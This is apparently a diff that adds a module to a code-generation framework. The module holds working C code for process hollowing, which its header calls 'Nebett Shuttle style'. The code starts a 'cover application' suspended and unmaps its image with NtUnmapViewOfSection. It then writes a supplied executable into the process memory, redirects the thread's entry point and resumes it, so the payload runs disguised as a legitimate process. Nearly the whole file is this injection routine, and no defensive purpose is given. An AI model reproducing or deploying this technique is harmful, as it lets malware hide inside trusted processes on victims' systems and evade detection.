@@ -1,0 +1,144 @@
+#DOC
+Inject buffered executable inside a process, Nebett Shuttle style
+Code stolen from Gary Nebett, from SIGSEGV on rohitab, from  jowo on StackOverflow
+In vars : buffered executable (IVAR1), cover application path (IVAR2)
+
+#INVAR
+IVAR1, IVAR2
+
+#OTVAR
+
+#INCLUDES
+<windows.h>,<winnt.h>
+
+#VARS
+IMAGE_NT_HEADERS INH, IMAGE_DOS_HEADER IDH, char* lfMemory, DWORD localImageBase, DWORD localImageSize, DWORD dwImageSize, char* pMemory, char* pFile, DWORD dwHeader, DWORD firstSection, IMAGE_SECTION_HEADER Sections[1000], DWORD jmpSize, DWORD dwSectionCount, DWORD dwWritten, DWORD dwSectionCount, DWORD dwSectionSize, PROCESS_INFORMATION peProcessInformation, STARTUPINFO peStartUpInformation, CONTEXT pContext, char pPath[MAX_PATH], DWORD previousProtection, char* lfMemory, int fSize, FILE* pLocalFile, PVOID OldValue, int i, int section_offset, PIMAGE_SECTION_HEADER section_header, LPBYTE file_data
+
+#HEADER
+
+#MAIN
+
+typedef long int (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
+NtUnmapViewOfSectionF NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"),"NtUnmapViewOfSection");
+
+OldValue = NULL;
+
+memset(&peStartUpInformation,0,sizeof(peStartUpInformation));
+memset(&peProcessInformation,0,sizeof(peProcessInformation));
+memset(&pContext,0,sizeof(pContext));
+peStartUpInformation.cb = sizeof(peStartUpInformation);
+
+memset(&pPath,0,sizeof(IVAR2));
+memcpy(&pPath,IVAR2,sizeof(IVAR2));
+
+//GetModuleFileName(NULL,pPath,MAX_PATH);
+
+//pLocalFile = fopen(pPath,"rb");
+//fseek(pLocalFile,0,SEEK_END);
+//fSize = ftell(pLocalFile);
+//rewind(pLocalFile);
+//lfMemory = (char*)malloc(fSize);
+//fread(lfMemory,1,fSize,pLocalFile);
+//fclose(pLocalFile);
+
+//memcpy(&IDH,lfMemory,sizeof(IDH));
+//memcpy(&INH,(void*)((DWORD)lfMemory+IDH.e_lfanew),sizeof(INH));
+
+//free(lfMemory);
+
+//localImageBase = INH.OptionalHeader.ImageBase;
+//localImageSize = INH.OptionalHeader.SizeOfImage;
+
+file_data = (char*)malloc(sizeof(IVAR1));
+memset(file_data,0,sizeof(IVAR1));
+memcpy(file_data,IVAR1,sizeof(IVAR1));
+
+memcpy(&IDH,IVAR1,sizeof(IDH));
+memcpy(&INH,(void*)((DWORD)IVAR1+IDH.e_lfanew),sizeof(INH));
+
+dwImageSize = INH.OptionalHeader.SizeOfImage;
+pMemory = (char*)malloc(dwImageSize);
+memset(pMemory,0,dwImageSize);
+pFile = pMemory;
+
+dwHeader = INH.OptionalHeader.SizeOfHeaders;
+firstSection = (DWORD)(((DWORD)IVAR1+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
+memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);
+memcpy(pFile,IVAR1,dwHeader);
+
+if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
+jmpSize = INH.OptionalHeader.SizeOfHeaders;
+else
+{
+jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
+jmpSize += 1;
+jmpSize *= INH.OptionalHeader.SectionAlignment;
+}
+
+pFile = (char*)((DWORD)pFile + jmpSize);
+
+for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
+{
+jmpSize = 0;
+dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
+memcpy(pFile,(char*)(IVAR1 + Sections[dwSectionCount].PointerToRawData),dwSectionSize);
+
+if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
+{
+jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
+}
+else
+{
+jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
+jmpSize += 1;
+jmpSize *= INH.OptionalHeader.SectionAlignment;
+}
+pFile = (char*)((DWORD)pFile + jmpSize);
+}
+
+//Wow64DisableWow64FsRedirection(&OldValue);
+
+CreateProcess(NULL,pPath,NULL,NULL,0,CREATE_SUSPENDED,NULL,NULL,&peStartUpInformation,&peProcessInformation);
+
+//Wow64RevertWow64FsRedirection(OldValue);
+
+pContext.ContextFlags = CONTEXT_FULL;
+GetThreadContext(peProcessInformation.hThread,&pContext);
+
+//if (INH.OptionalHeader.ImageBase==localImageBase&&INH.OptionalHeader.SizeOfImage<=localImageSize)
+//VirtualProtectEx(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
+//else
+//{
+//NtUnmapViewOfSection(peProcessInformation.hProcess,(PVOID)(localImageBase));
+
+NtUnmapViewOfSection(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase));
+VirtualAllocEx(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase),dwImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+
+//}
+
+//WriteProcessMemory(peProcessInformation.hProcess, (PVOID)INH.OptionalHeader.ImageBase, &file_data[0],INH.OptionalHeader.SizeOfHeaders, &dwWritten);
+
+//section_header = IMAGE_FIRST_SECTION(&INH);
+
+//for(i = 0; i < INH.FileHeader.NumberOfSections; i++) {
+
+//section_offset = IDH.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);
+//section_header = (PIMAGE_SECTION_HEADER)(&file_data[section_offset]);
+
+//WriteProcessMemory(peProcessInformation.hProcess, (PVOID)(INH.OptionalHeader.ImageBase + section_header[i].VirtualAddress), &file_data[section_header[i].PointerToRawData], section_header[i].SizeOfRawData, &dwWritten);
+
+//WriteProcessMemory(peProcessInformation.hProcess, (PVOID)(INH.OptionalHeader.ImageBase + section_header->VirtualAddress), &file_data[section_header->PointerToRawData], section_header->SizeOfRawData, &dwWritten);
+//}
+
+WriteProcessMemory(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
+
+WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Ebx+8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
+
+pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
+SetThreadContext(peProcessInformation.hThread,&pContext);
+VirtualProtectEx(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
+ResumeThread(peProcessInformation.hThread);
+
+free(pMemory);
+
+#FOOTER
